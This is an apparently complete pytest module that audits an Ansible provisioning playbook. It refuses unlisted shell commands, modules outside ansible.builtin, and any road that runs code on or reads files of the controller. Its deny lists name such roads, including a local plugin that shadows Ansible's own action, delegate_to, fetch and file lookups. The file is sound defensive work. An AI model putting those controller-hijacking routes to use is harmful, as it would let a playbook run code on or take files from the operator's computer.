"""Layer 1 is held to state modules: every task the system play reaches (playbooks/system.yml; docs/architecture/
engine.md §16.10) is a module of ansible.builtin that converges a state, or one of the commands below with its reason.

The walk is this file's own, and reads what Ansible reads: the play's pre_tasks, tasks, post_tasks and handlers, a
block's block, rescue and always among them; the task files they import or include by a literal name, in any spelling
(short, ansible.builtin., ansible.legacy.), from the including file's folder, or a role's tasks/; each role the play
names, a role includes or imports from anywhere, or a role's meta/main.yml names among its dependencies, found where
Ansible finds it (the roles' folder, roles_path), with its tasks, handlers, defaults, vars, meta and argument specs in
every spelling Ansible takes (main.yml, main.yaml, main.json, main, and a main/ folder of defaults or vars), the files
an include's tasks_from, handlers_from, vars_from and defaults_from name; the play's vars_files; each role's templates a
template task names; and each file of a role's files/ that a copy, unarchive, assemble or uri sends from this computer
(src, and uri's multipart filenames, unless remote_src is true, as it is for assemble unless said). A road it does not
follow is never passed over: it raises Unfollowed, which fails every test here by name - a playbook imported, an include
in a handler (Ansible resolves those otherwise), a file or a role named by a template, a name Ansible reads otherwise
than the walk (one that starts with ~, which Ansible takes from the person's home, holds a $, which it expands, or is
quoted), a role of a collection, a collections keyword (under which a short name can stand for a collection's module),
a role in the play's own roles/ folder (which Ansible searches before roles_path), a template outside a role; a
template, or any string of a file the walk read, that names another template (include, import, from, extends: in a
task's string Ansible looks for it beside the play) or sets its own delimiters (a #jinja2: line, or the template
task's six delimiter arguments), under which such a statement reads as text; arguments the walk does not read -
module_defaults on a play, a role entry, a block, a task or an include's apply, args: given as one template, or a
module's own value one template, each merged into the task's arguments after the parser has read them; a task file
Ansible looks for elsewhere before the walk's - an import in a role's file that an include or import brought in (first
under that file's own folder's tasks/, then the working folder's tasks/), and an include or import two files below the
play (beside the play first); a file of this computer sent from outside a role, or one that is no file of its role's
files/; and what Ansible takes from the play's folder that the walk does not read - a folder of plugins but the three
BESIDE_THE_PLAY lists, a name of Ansible's own module, action or module_utils in those three (Ansible looks for its own
under ansible.legacy there first: a local normal.py runs for every module that has no action of its own), collections/,
and group_vars/ or host_vars/, whose variables reach the host whenever it joins a group - and any folder of plugins in
a role, each kind read from Ansible itself.

Four tests hold what it finds. A command, shell, raw, script or expect task that REASONS does not list fails by its file
and name, one REASONS lists that is no longer reached fails, and so does one whose module or arguments are not the ones
REASONS holds with its reason, so that a reason is held to what runs and the list tightens by itself; two such tasks of
one file and name fail as one key. A module that does not resolve within ansible.builtin fails by name - one written
outside it, and a name of ansible.builtin that ansible-core's own routing table, read from the installed package, sends
to a collection (ansible.builtin.synchronize is ansible.posix's, whose rsync starts here) or has removed - but for the
three OUTSIDE lists, which F6a replaces with built-in ones, so that the product needs no Galaxy collection: then OUTSIDE
is empty. Nothing
the play reaches sets a variable whose name begins ansible_, which would outrank the connection the engine wrote: a
play's vars, vars_files and vars_prompt, a role entry's params and vars, a role's defaults and vars, a block's or a
task's vars, a fact (a templated name refused), a register, a loop's variable, an include's apply, add_host, and any
include of variables (the play's own check sees every source of a host's variables but these, which it cannot). And
nothing the play reaches runs or writes on this computer: no delegate_to, local_action or connection keyword on a play,
a role entry, a block, a task or an include's apply, no fetch, no play over any host but all, no with_ loop, no
group_by or add_host (a group joined after the play's check of the connection), and no lookup but the five LOOKUPS
lists (lookup, query or q as a word, which Jinja calls wherever it is named), read in every string of every file the
walk read (a role's argument specs among them, which Ansible templates here as its check's arguments) and in the
templates.

Review 61's roads are run as Ansible runs them, too: each planted, refused by the scans, and run through layer1.run over
the test-only local connection on a stand-in machine, where its decoy writes a mark in the test's own folder - so each
road the scans refuse is one Ansible takes.
"""

from __future__ import annotations

import asyncio
import dataclasses
import functools
import json
import os
import re
import shutil
from collections.abc import Callable, Iterable, Iterator
from pathlib import Path

import pytest
import yaml
from aw_machine import Machine, filed, layer1_host, machine, target
from harness import REPO, _executable

from claude_vm.fleet import paths
from claude_vm.guest import layer1
from claude_vm.runs import job as jobs
from claude_vm.runs import rundir

PLAY = REPO / "playbooks" / "system.yml"


def _spelt(*names: str) -> frozenset[str]:
    """Each of names by every name Ansible takes for one of its own: short, ansible.builtin. and ansible.legacy."""
    return frozenset(f"{prefix}{name}" for prefix in ("", "ansible.builtin.", "ansible.legacy.") for name in names)


# What runs a command of the machine's rather than converge a state.
COMMANDS = _spelt("command", "shell", "raw", "script", "expect")
# Where a task sets a variable by name: a fact, an include of variables, a host added with variables of its own.
SET_FACT = _spelt("set_fact")
INCLUDE_VARS = _spelt("include_vars")
ADD_HOST = _spelt("add_host")
# The roads to more tasks: a task file, a role, a playbook; and the static one Ansible resolves otherwise when nested.
TASK_INCLUDES = _spelt("include_tasks", "import_tasks")
IMPORT_TASKS = _spelt("import_tasks")
ROLE_INCLUDES = _spelt("include_role", "import_role")
PLAYBOOK_IMPORTS = _spelt("import_playbook")
# A task that renders one of the role's templates, read for a lookup too.
TEMPLATES = _spelt("template")
# What writes on this computer whatever it is given: a file fetched from the machine.
FETCH = _spelt("fetch")
# What reads a file of this computer and sends it to the machine (their actions read src, and uri's multipart
# filenames, here unless remote_src): assemble's remote_src is true unless said, an unarchive's old copy key is read as
# a file of this computer's.
SENT = _spelt("copy", "unarchive", "assemble", "uri")
ASSEMBLE = _spelt("assemble")
UNARCHIVE = _spelt("unarchive")
URI = _spelt("uri")
# What joins a group after the play's check of the connection: Ansible then reads that group's variables beside the
# play and the inventory, which the check never saw.
GROUPS = _spelt("group_by", "add_host")
# The folders beside the play whose files Ansible reads as a host's variables.
HOST_VARIABLES = ("group_vars", "host_vars")
# The folders of plugins beside today's playbooks, which layer 1's play shares, and why each is no road: what is in
# them is reached by a name of its own alone, which outside() refuses, while a name of Ansible's own there is refused.
BESIDE_THE_PLAY = {
    "library": "today's playbooks' own modules, which the system play calls by no name",
    "action_plugins": "today's playbooks' own actions, which the system play calls by no name",
    "module_utils": "the code today's own modules share, which no module of Ansible's imports",
}
# The keywords that run a task, a block, a role or a play somewhere other than on the machine.
ELSEWHERE = ("delegate_to", "local_action", "connection")
# What makes a dict of a task list a block rather than a task, as Ansible's Block.is_block reads it.
BLOCK = ("block", "rescue", "always")
# The folders of a role that Ansible reads: none of them may be a link.
ROLE_FOLDERS = ("tasks", "handlers", "defaults", "vars", "meta", "files", "templates")
# An include of a role's: which of its folders each of its _from keys names a file of.
FROM = {"tasks_from": "tasks", "vars_from": "vars", "defaults_from": "defaults", "handlers_from": "handlers"}
# A role's name the walk follows: one of the roles' folder, never a collection's (a dot) or a path.
ROLE_NAME = re.compile(r"[A-Za-z0-9_][A-Za-z0-9_-]*")
# A file's name the walk follows, as the roles name files: relative, each part begun by a letter, a digit or _, so that
# no part is a way up and nothing in it is one Ansible reads otherwise - a leading ~ (the person's home), a $ (an
# environment variable, expanded) or quotes (taken off).
FILE_NAME = re.compile(r"[A-Za-z0-9_][A-Za-z0-9_.-]*(?:/[A-Za-z0-9_][A-Za-z0-9_.-]*)*")
# What opens a template, in a name Ansible would render before it found the file.
TEMPLATE = ("{{", "{%", "{#")
# A lookup, in any string: Ansible's lookup, query and q, each as a word, called where it is named or elsewhere.
LOOKUP = re.compile(r"\b(?:lookup|query|q)\b")
# A template that names another template, whose lookups the walk would not read: Jinja's {%- and {%+ too, read in a
# template and in every string, each of which Ansible renders with the play's folder to load from.
TEMPLATE_INCLUDE = re.compile(r"\{%[-+]?\s*(?:include|import|from|extends)\b")
# Review 67's 4: the filters that read this computer where Ansible renders, here - its folders' names (fileglob), its
# links and working folder (realpath, relpath), its home (expanduser) and the child's environment (expandvars) - beside
# ansible-core's files tests and core's vaulted_file, which opens the file (file_tests()); the filters that apply a
# test or a filter given by its name, and which of their arguments names it; the keywords whose string Ansible
# evaluates as an expression, with no {{ }} around it (review 67's 8: a loop's break_when too); the actions that
# evaluate one of their arguments so, read as Ansible's parser reads the arguments (var=... and that=... too); and what
# closes a template, of which a condition that starts with an opener and ends with one is made whole (review 67's 9).
PATH_FILTERS = ("fileglob", "realpath", "relpath", "expanduser", "expandvars")
CORE_FILE_TESTS = ("vaulted_file",)
BY_NAME = {"select": 0, "reject": 0, "selectattr": 1, "rejectattr": 1, "map": 0}
EXPRESSIONS = ("when", "changed_when", "failed_when", "until", "break_when")
EXPRESSION_ARGS = {**dict.fromkeys(_spelt("debug"), "var"), **dict.fromkeys(_spelt("assert"), "that")}
TEMPLATE_END = ("}}", "%}", "#}")
# What makes a string or a template set its own delimiters, under which an include reads as text: Ansible's prefix of
# a template's first line (JINJA2_OVERRIDE), and the template action's six arguments.
TEMPLATE_HEADER = "#jinja2:"
DELIMITERS = (
    "block_start_string",
    "block_end_string",
    "variable_start_string",
    "variable_end_string",
    "comment_start_string",
    "comment_end_string",
)
# The keyword that hands a task arguments of a play's, a role entry's, a block's or its own, merged after the parser
# has read them: the walk reads a task's arguments as written, so it is refused wherever a keyword can stand.
MODULE_DEFAULTS = "module_defaults"

# Every command the play reaches, by its file and name: why no state module serves it, then the module and its arguments
# exactly as Ansible's own parser reads them from the task, so that a reason is held to what runs. Those of today's
# roles stay as they stand until the cutover trims the roles (K28); the 1.x move is a no-op on a new machine until then.
REASONS: dict[tuple[str, str], tuple[str, str, dict]] = {
    ("playbooks/system.yml", "Read what the VM's base has"): (
        "raw, before anything needs Python: what the base lacks and what it can never run, read once",
        "ansible.builtin.raw",
        {
            "_raw_params": (
                'missing=""; for f in /usr/bin/python3 /usr/bin/sudo; do [ -x "$f" ] || missing="$missing $f"; '
                "done; for c in apt-get systemctl{{ ' cloud-init' if configure_wait_for_cloud_init | default(true) | "
                'bool else \'\' }}; do command -v "$c" > /dev/null 2>&1 || missing="$missing $c"; done; family=$(. '
                '/etc/os-release 2> /dev/null; echo " $ID $ID_LIKE "); case "$family" in *" debian "* | *" '
                'ubuntu "*) ;; *) missing="$missing an-Ubuntu-or-Debian-system"; esac; echo '
                '"base-missing:$missing"; arch=$(uname -m 2> /dev/null); bits=$(getconf LONG_BIT 2> /dev/null); '
                'case "$arch" in x86_64 | aarch64) ;; *) echo "base-refused:it is ${arch:-a machine uname does not '
                'name}, and Claude Code runs on x86_64 and aarch64 alone"; esac; [ "$bits" = 64 ] || echo '
                '"base-refused:its userland is ${bits:-not}-bit, and Claude Code runs on a 64-bit one alone"; if [ '
                '"$arch" = x86_64 ] && ! grep -qw avx /proc/cpuinfo 2> /dev/null; then echo "base-refused:its CPU '
                'has no AVX, which Claude Code needs: give the VM the CPU type host, or another that has it"; fi; '
                'for f in /lib/ld-musl-*; do if [ -e "$f" ]; then echo "base-refused:its C library is musl, which '
                "Docker's packages and Tailscale's do not run on\"; break; fi; done; if [ -e /run/ostree-booted ] || "
                "[ -e /etc/NIXOS ]; then echo \"base-refused:its packages are an image's (ostree or NixOS), not "
                'installed one by one as configure installs them"; fi; true'
            ),
        },
    ),
    ("playbooks/system.yml", "Wait for cloud-init to finish"): (
        "a read that waits: cloud-init status --wait",
        "ansible.builtin.command",
        {
            "cmd": "cloud-init status --wait",
        },
    ),
    ("playbooks/system.yml", "Read what cloud-init reported"): (
        "a read: cloud-init status --long, for the failure",
        "ansible.builtin.command",
        {
            "cmd": "cloud-init status --long",
        },
    ),
    ("roles/common/tasks/names.yml", "names | Move each file to its name from 2.0"): (
        "the 1.x moves, mv -n with creates and removes: a no-op on a new machine until K28 deletes it",
        "ansible.builtin.command",
        {
            "argv": ["mv", "-n", "{{ common_names_item.old }}", "{{ common_names_item.new }}"],
            "creates": "{{ common_names_item.new }}",
            "removes": "{{ common_names_item.old }}",
        },
    ),
    ("roles/common/tasks/sudo.yml", "sudo | Hash the user's password"): (
        "openssl passwd, the hash the user module is given: Python's crypt is gone from the controller",
        "ansible.builtin.command",
        {
            "argv": ["openssl", "passwd", -6, "-salt", "{{ common_user_password_salt }}", "-stdin"],
            "stdin": "{{ common_user_password }}",
        },
    ),
    ("roles/common/tasks/sudo.yml", "sudo | Read what sudo lets the user run now"): (
        "a read: sudo -l -U",
        "ansible.builtin.command",
        {
            "argv": ["/usr/bin/sudo", "-l", "-U", "{{ common_user }}"],
        },
    ),
    ("roles/common/tasks/sudo.yml", "sudo | Take the user out of the groups that reach root or the password"): (
        "gpasswd --delete, one group at a time: the user module sets a whole list of groups or appends",
        "ansible.builtin.command",
        {
            "argv": ["gpasswd", "--delete", "{{ common_user }}", "{{ common_user_group }}"],
        },
    ),
    ("roles/common/tasks/sudo.yml", "sudo | Read what sudo lets the user run in the end"): (
        "a read: sudo -l -U",
        "ansible.builtin.command",
        {
            "argv": ["/usr/bin/sudo", "-l", "-U", "{{ common_user }}"],
        },
    ),
    ("roles/common/tasks/ssh_path.yml", "ssh_path | Find where the connections come from, for {{ common_user }}"): (
        "a read: printenv SSH_CONNECTION, which no fact carries",
        "ansible.builtin.command",
        {
            "argv": ["printenv", "SSH_CONNECTION"],
        },
    ),
    ("roles/common/tasks/ssh_path.yml", "ssh_path | Read the PATH sshd gives the sessions of {{ common_user }}"): (
        "a read: sshd -T -C, what sshd applies, Match blocks included",
        "ansible.builtin.command",
        {
            "argv": [
                "/usr/sbin/sshd",
                "-T",
                "-C",
                "{{ common_ssh_connection.stdout | default('') | sshd_match_spec(common_user) }}",
            ],
        },
    ),
    ("roles/common/tasks/masked_units.yml", "masked_units | List which of the units to mask the VM has"): (
        "a read: systemctl list-unit-files, the units the machine has",
        "ansible.builtin.command",
        {
            "argv": "{{ ['systemctl', 'list-unit-files', '--no-legend', '--full', '--'] + common_masked_units }}",
        },
    ),
    ("roles/common/tasks/masked_units.yml", "masked_units | Read which of the units failed"): (
        "a read: systemctl is-failed",
        "ansible.builtin.command",
        {
            "argv": "{{ ['systemctl', 'is-failed', '--'] + common_masked_units_doomed }}",
        },
    ),
    ("roles/common/tasks/masked_units.yml", "masked_units | Clear the failed state a unit was left in"): (
        "systemctl reset-failed, which systemd_service has no state for, only where a unit failed",
        "ansible.builtin.command",
        {
            "argv": "{{ ['systemctl', 'reset-failed', '--'] + common_masked_units_failed }}",
        },
    ),
    ("roles/vscode_server/tasks/main.yml", "Look for the tools the server installer needs"): (
        "a read: command -v bash tar curl wget",
        "ansible.builtin.command",
        {
            "argv": ["bash", "-c", "command -v bash tar && { command -v curl || command -v wget; }"],
        },
    ),
    ("roles/vscode_server/tasks/main.yml", "Find where the editor's connection will come from"): (
        "a read: printenv SSH_CONNECTION, which no fact carries",
        "ansible.builtin.command",
        {
            "argv": ["printenv", "SSH_CONNECTION"],
        },
    ),
    ("roles/vscode_server/tasks/main.yml", "Read the configuration sshd applies to the editor's connection"): (
        "a read: sshd -T -C, what sshd applies, Match blocks included",
        "ansible.builtin.command",
        {
            "argv": [
                "/usr/sbin/sshd",
                "-T",
                "-C",
                "{{ vscode_server_ssh_connection.stdout | default('') | sshd_match_spec(vscode_server_user) }}",
            ],
        },
    ),
    ("roles/dev_tools/tasks/main.yml", "Take the user out of the docker group"): (
        "gpasswd --delete, one group at a time: the user module sets a whole list of groups or appends",
        "ansible.builtin.command",
        {
            "argv": ["gpasswd", "--delete", "{{ dev_tools_user }}", "docker"],
        },
    ),
    ("roles/dev_tools/tasks/uv.yml", "uv | Check installed version"): (
        "a read: uv --version",
        "ansible.builtin.command",
        {
            "argv": ["{{ dev_tools_uv_install_dir }}/uv", "--version"],
        },
    ),
    ("roles/dev_tools/tasks/rust.yml", "rust | Read the components installed for {{ dev_tools_rust_toolchain }}"): (
        "a read: rustup component list, from the toolchain's own manifest",
        "ansible.builtin.command",
        {
            "argv": ["rustup", "component", "list", "--installed", "--toolchain", "{{ dev_tools_rust_toolchain }}"],
        },
    ),
    ("roles/dev_tools/tasks/rust.yml", "rust | Install Rust {{ dev_tools_rust_toolchain }}"): (
        "rustup toolchain install, only where the toolchain is missing: rustup has no module",
        "ansible.builtin.command",
        {
            "argv": (
                "{{ ['rustup', 'toolchain', 'install', dev_tools_rust_toolchain, '--profile', 'minimal']\n   + "
                "dev_tools_rust_components | map('regex_replace', '^', '--component=') | list }}"
            ),
        },
    ),
    ("roles/dev_tools/tasks/rust.yml", "rust | Add the components the toolchain is missing"): (
        "rustup component add, only of those missing: rustup has no module",
        "ansible.builtin.command",
        {
            "argv": (
                "{{ ['rustup', 'component', 'add', '--toolchain', dev_tools_rust_toolchain] + dev_tools_rust_missing }}"
            ),
        },
    ),
}

# The modules outside ansible.builtin the play reaches, by file and name: three, each replaced by a built-in one in
# F6a, which takes them off this list.
OUTSIDE = {
    ("roles/common/tasks/main.yml", "Authorise SSH keys"): ("ansible.posix.authorized_key", "replaced by F6a"),
    ("roles/vscode_server/tasks/main.yml", "Raise the inotify watch limit for the editor's file watcher"): (
        "ansible.posix.sysctl",
        "replaced by F6a",
    ),
    ("roles/dev_tools/tasks/node.yml", "node | Install global npm packages"): (
        "community.general.npm",
        "replaced by F6a",
    ),
}

# Every string the play reaches that runs a lookup, on this computer, by its file and the whole string: what it reads.
LOOKUPS = {
    (
        "playbooks/system.yml",
        "{{ (lookup('ansible.builtin.file', ansible_inventory_sources | first) | from_json)['all']['hosts'] }}",
    ): "the inventory layer 1 wrote, read back by its own source, for the check of the connection",
    (
        "playbooks/tasks/remote_tmp.yml",
        "{{ lookup('ansible.builtin.config', 'remote_tmp', plugin_type='shell', plugin_name='sh') }}",
    ): "Ansible's own setting of root's temporary folder on the machine",
    ("roles/dev_tools/tasks/gh.yml", "{{ lookup('ansible.builtin.file', 'github-cli.asc') }}"): (
        "the GitHub CLI's signing key, a file of the role's own"
    ),
    ("roles/dev_tools/tasks/node.yml", "{{ lookup('ansible.builtin.file', 'nodesource.asc') }}"): (
        "NodeSource's signing key, a file of the role's own"
    ),
    ("roles/dev_tools/tasks/docker.yml", "{{ lookup('ansible.builtin.file', 'docker.asc') }}"): (
        "Docker's signing key, a file of the role's own"
    ),
}


class Unfollowed(ValueError):
    """A road to a task, a variable or this computer that the walk does not follow: every test here fails on it."""


class Repeated(ValueError):
    """Two tasks of one file and one name, where a task is held by its file and name: one could stand for the other."""


@dataclasses.dataclass
class Walk:
    """What the play reaches, each with the file that holds it: the plays; every task, handler and block; every role
    entry of a play's roles: or a meta/main.yml's dependencies; every file of variables (vars_files, the roles' defaults
    and vars); every file read; and the templates a template task renders."""

    plays: list[tuple[Path, dict]] = dataclasses.field(default_factory=list)
    entries: list[tuple[Path, dict]] = dataclasses.field(default_factory=list)
    roles: list[tuple[Path, object]] = dataclasses.field(default_factory=list)
    variables: list[Path] = dataclasses.field(default_factory=list)
    files: list[Path] = dataclasses.field(default_factory=list)
    templates: list[Path] = dataclasses.field(default_factory=list)


def _where(path: Path, repo: Path) -> str:
    return str(path.relative_to(repo))


def _parsed(task: dict) -> tuple[str, dict, object]:
    """The module or action a task calls as written, its arguments, and where it is delegated (Ansible's Sentinel where
    it is not), as Ansible's own parser finds them among the task's keys: action:, local_action:, k=v forms included."""
    from ansible.parsing.mod_args import ModuleArgsParser

    return ModuleArgsParser(task_ds=task).parse(skip_action_validation=True)


def _role_files(root: Path, folder: str, main: str | None, allow_dir: bool) -> list[Path]:
    """The files of a role's folder Ansible loads (Role._load_role_yaml): main.yml, main.yaml, main.json, then main,
    the first there; for a file named by an include's _from, that name first as it stands; and for defaults and vars, a
    main/ folder's files. Unfollowed where a file named by a _from is not there."""
    from ansible.parsing.dataloader import DataLoader

    where = root / folder
    if not where.is_dir():
        if main is not None:
            raise Unfollowed(f"{where}: {folder}/{main}, which an include names, is not there")
        return []
    extensions = [".yml", ".yaml", ".json"]
    if main is None:
        name, extensions = "main", [*extensions, ""]
    else:
        name, extensions = main, ["", *extensions]
    found = [Path(each) for each in DataLoader().find_vars_files(str(where), name, extensions, allow_dir)]
    if main is not None and not found:
        raise Unfollowed(f"{where}: {folder}/{main}, which an include names, is not there")
    return found


def _literal(value: object, said: str) -> str:
    """A file's name as written, which the walk can follow: a relative path with no template in it, no way up, and
    nothing Ansible reads otherwise than the walk (FILE_NAME)."""
    if not isinstance(value, str) or not value or any(opener in value for opener in TEMPLATE):
        raise Unfollowed(f"{said}, {value!r}: a name the walk cannot follow, only a literal one")
    if not FILE_NAME.fullmatch(value):
        raise Unfollowed(
            f"{said}, {value!r}: the walk follows a relative name with no way up, as the roles name files: Ansible"
            " takes a name that starts with ~ from the person's home, expands a $ and takes quotes off"
        )
    return value


@functools.cache
def plugin_folders() -> frozenset[str]:
    """Every folder Ansible loads plugins from beside a play and in each role it loads (add_all_plugin_dirs, and a
    role's own load): each of its plugin loaders' folder, read from Ansible itself."""
    from ansible.plugins.loader import get_all_plugin_loaders

    return frozenset(loader.subdir for _, loader in get_all_plugin_loaders() if loader.subdir)


def _ansible() -> Path:
    """The installed ansible-core's own folder, where its files are read: never a package's __path__, which a test that
    imports today's module_utils extends."""
    import importlib.util

    spec = importlib.util.find_spec("ansible")
    assert spec is not None and spec.origin is not None
    return Path(spec.origin).parent


@functools.cache
def _names_in(*folders: str) -> frozenset[str]:
    """The names of the plugins in folders of the installed ansible-core, a leading _ (its mark of an alias) taken
    off."""
    import pkgutil

    return frozenset(each.name.lstrip("_") for each in pkgutil.iter_modules([str(_ansible() / f) for f in folders]))


def ansibles_own() -> frozenset[str]:
    """The names of Ansible's own modules, actions and module_utils, which it looks for under ansible.legacy in the
    play's folders before its own: read from the installed package's folders."""
    return _names_in("modules", "plugins/action", "module_utils")


@functools.cache
def routing() -> dict[str, dict]:
    """Where ansible-core routes a name of ansible.builtin, for an action plugin and for a module: its own table
    (config/ansible_builtin_runtime.yml's plugin_routing), read from the installed package, which sends hundreds of
    names to the collections."""
    table = yaml.safe_load((_ansible() / "config" / "ansible_builtin_runtime.yml").read_text())["plugin_routing"]
    return {section: table.get(section) or {} for section in ("action", "modules")}


def _routed(short: str, section: str) -> tuple[str | None, str]:
    """The name ansible.builtin.<short> comes to in one section of the routing table, followed to its end; or None, and
    where it goes instead: out of ansible.builtin, removed, or round in a circle."""
    seen: set[str] = set()
    while short not in seen:
        seen.add(short)
        entry = routing()[section].get(short) or {}
        if "tombstone" in entry:
            return None, "which ansible-core has removed"
        redirect = entry.get("redirect")
        if redirect is None:
            return short, ""
        if not str(redirect).startswith("ansible.builtin."):
            return None, f"which ansible-core routes to {redirect}"
        short = str(redirect).removeprefix("ansible.builtin.")
    return None, "which ansible-core routes round in a circle"


def not_builtin(action: str) -> str | None:
    """None where a task's action resolves within ansible.builtin as ansible-core resolves it: written as
    ansible.builtin.<name>, kept within ansible.builtin by the routing table for its action plugin and its module, and
    one of ansible-core's own actions or modules there. Otherwise what is said of it: the name as written, or why a
    name of ansible.builtin is not one (ansible.builtin.synchronize runs ansible.posix's rsync from here)."""
    if not action.startswith("ansible.builtin."):
        return action
    short = action.removeprefix("ansible.builtin.")
    found: dict[str, str] = {}
    for section in ("action", "modules"):
        name, why = _routed(short, section)
        if name is None:
            return f"{action}, {why}"
        found[section] = name
    if found["action"] in _names_in("plugins/action") or found["modules"] in _names_in("modules"):
        return None
    return f"{action}, which is no action or module of ansible-core's"


@functools.cache
def private_fields() -> frozenset[str]:
    """The fields ansible-core keeps for itself on a task, a handler or a block (a FieldAttribute's private), which it
    takes from a task's YAML all the same: loop_with names the lookup a with_ loop runs, and runs it over loop."""
    from ansible.playbook.block import Block
    from ansible.playbook.handler import Handler
    from ansible.playbook.task import Task

    kinds = (Task, Handler, Block)
    return frozenset(name for kind in kinds for name, field in kind.fattributes.items() if field.private)


@functools.cache
def file_tests() -> frozenset[str]:
    """Jinja's tests that look at this computer's paths where Ansible renders, here: ansible-core's files test plugin,
    read from it, but abs (and is_abs), which reads a name's text alone; and core's vaulted_file, which opens the file
    to read whether it is a vault."""
    from ansible.plugins.test.files import TestModule

    files = frozenset(name for name in TestModule().tests() if name not in ("abs", "is_abs"))
    return files | frozenset(CORE_FILE_TESTS)


def _builtin(name: str) -> str:
    """A test's or a filter's name as ansible-core resolves one of its own: short, ansible.builtin. or
    ansible.legacy."""
    return name.removeprefix("ansible.builtin.").removeprefix("ansible.legacy.")


def _reads_paths(text: str, expression: bool) -> list[str]:
    """What text, which Ansible renders here (an expression where expression is true), asks of this computer's paths,
    each said by its name, as Jinja reads it: a test of file_tests(), a filter of PATH_FILTERS, either named to a filter
    of BY_NAME, or a name BY_NAME's filter is given that only a run can say. A text Jinja cannot read is said too; and,
    as Ansible evaluates a condition, an expression made of one template, whose result it evaluates, and the template a
    string of an expression holds, which it renders (review 67's 9)."""
    import jinja2
    from jinja2 import nodes

    if expression and text.strip().startswith(TEMPLATE) and text.strip().endswith(TEMPLATE_END):
        return ["an expression made of one template, whose result Ansible evaluates as one the walk cannot read"]
    source = f"{{{{ {text} }}}}" if expression else text
    try:
        tree = jinja2.Environment().parse(source)
    except jinja2.TemplateSyntaxError as error:
        return [f"a template Jinja cannot read, which the walk cannot hold ({error.message})"]
    said = []
    for node in tree.find_all((nodes.Test, nodes.Filter)):
        name = _builtin(node.name)
        test, path_filter = isinstance(node, nodes.Test), isinstance(node, nodes.Filter)
        if (test and name in file_tests()) or (path_filter and name in PATH_FILTERS):
            said.append(f"the {type(node).__name__.lower()} {node.name}, which reads this computer's paths")
        if not path_filter or name not in BY_NAME:
            continue
        if node.dyn_args is not None or node.dyn_kwargs is not None:
            said.append(f"{node.name} given its arguments by * or **, a name only a run can say")
        else:
            said += _named(node.name, list(node.args), BY_NAME[name])
    if expression:
        for each in tree.find_all(nodes.Const):
            if isinstance(each.value, str) and any(opener in each.value for opener in TEMPLATE):
                said += _reads_paths(each.value, False)
    return said


def _named(by: str, args: list, at: int) -> list[str]:
    """What the filter by of BY_NAME is given at args[at], as a test's or a filter's name; where that name is one of
    BY_NAME's too (map('select', 'exists')), what it is given in turn, from the arguments after it."""
    from jinja2 import nodes

    while len(args) > at:
        given = args[at]
        if not isinstance(given, nodes.Const) or not isinstance(given.value, str):
            return [f"{by} given a test or a filter by a name only a run can say"]
        name = _builtin(given.value)
        if name in file_tests() | frozenset(PATH_FILTERS):
            return [f"{by} given {given.value}, which reads this computer's paths"]
        if name not in BY_NAME:
            return []
        by, args, at = given.value, args[at + 1 :], BY_NAME[name]
    return []


def _rendered(value: object, key: object = None) -> Iterator[tuple[str, bool]]:
    """Each string of a document that Ansible renders: one that opens a template, and one of EXPRESSIONS' values, an
    expression; with whether it is one. A mapping's keys are names, never rendered. The arguments EXPRESSION_ARGS
    names are read from each task as Ansible's parser reads them, in reaching_this_computer."""
    if isinstance(value, str):
        if key in EXPRESSIONS or any(opener in value for opener in TEMPLATE):
            yield value, key in EXPRESSIONS
    elif isinstance(value, dict):
        for name, each in value.items():
            yield from _rendered(each, name)
    elif isinstance(value, list):
        for each in value:
            yield from _rendered(each, key)


def _beside_the_play(basedir: Path, repo: Path) -> None:
    """Unfollowed on what Ansible takes from the play's own folder that the walk does not read: group_vars/ and
    host_vars/, a folder of plugins but the three BESIDE_THE_PLAY lists, collections/ (searched whatever the
    configuration names), and a name of Ansible's own in the three."""
    for entry in sorted(basedir.iterdir()):
        said = _where(entry, repo)
        if entry.name in HOST_VARIABLES:
            raise Unfollowed(f"{said}: variables of the play's host, reaching it as it joins a group after the check")
        if entry.name == "collections" or (entry.name in plugin_folders() and entry.name not in BESIDE_THE_PLAY):
            raise Unfollowed(f"{said}: a folder Ansible loads code from beside the play, run on this computer")
        if entry.name in BESIDE_THE_PLAY and entry.is_dir():
            for each in sorted(entry.iterdir()):
                if Path(each.name).stem.lstrip("_") in ansibles_own():
                    raise Unfollowed(f"{_where(each, repo)}: a name of Ansible's own, which it takes from here first")


def _sent_from_here(action: str, args: dict, said: str) -> list[object]:
    """The names of the files of this computer a task's action reads and sends to the machine: copy's, unarchive's,
    assemble's and uri's src, and uri's multipart filenames, but where remote_src is true as written (assemble's
    default); a multipart body the walk cannot read raises Unfollowed."""
    if action not in SENT:
        return []
    if action in UNARCHIVE and "copy" in args:
        remote = False  # the old way to say where src is, read as this computer
    elif "remote_src" in args:
        remote = args["remote_src"] is True
    else:
        remote = action in ASSEMBLE
    if remote:
        return []
    names = [args["src"]] if "src" in args else []
    if action in URI:
        form = args.get("body_format")
        if form == "form-multipart" or (form is not None and (not isinstance(form, str) or _templated(form))):
            body = args.get("body")
            if body is not None and not isinstance(body, dict):
                raise Unfollowed(f"{said}: a multipart body the walk cannot read, whose files are read here")
            for value in (body or {}).values():
                if isinstance(value, dict) and "filename" in value:
                    names.append(value["filename"])
                elif _templated(value):
                    raise Unfollowed(f"{said}: a multipart field the walk cannot read, whose file is read here")
    return names


def _role_file(name: object, role: Path | None, said: str) -> None:
    """Unfollowed unless name is a file of role's files/, the first place Ansible looks for it from a role's task."""
    source = _literal(name, f"{said}: a file of this computer sent to the machine")
    if role is None:
        raise Unfollowed(f"{said}: {source}, a file of this computer sent from outside a role, with no files/")
    if Path(source).parts[0] == "files":
        raise Unfollowed(f"{said}: {source}, a name under files/, which Ansible looks for under the role's own first")
    path = role / "files" / source
    # Held to the role's own files/, never to where a link of that folder or one under it leads.
    if not path.is_file() or not path.resolve().is_relative_to(role.resolve() / "files"):
        raise Unfollowed(f"{said}: {source}, which is no file of its role's files/")


def _no_defaults(keywords: dict, said: str) -> None:
    """Unfollowed where keywords (a play's, a role entry's, a block's, a task's, an include's apply) hold
    module_defaults, which hands each task under it arguments merged after the parser has read them: a copy's src, a
    set_fact's names."""
    if MODULE_DEFAULTS in keywords:
        raise Unfollowed(f"{said} {MODULE_DEFAULTS}, arguments of the tasks under it that the walk does not read")


def _read_whole(action: str, args: dict, said: str) -> None:
    """Unfollowed where a task's arguments, as Ansible's own parser reads them, are a variable's rather than written:
    args: given as one template (_variable_params), or a module's own value one template (_raw_params with a template
    in it), which ansible-core merges as the task's arguments once it has rendered them; but for a command, whose words
    REASONS holds whole, and an include, whose name _literal holds."""
    if "_variable_params" in args:
        raise Unfollowed(f"{said}: args given as one template, arguments the walk does not read")
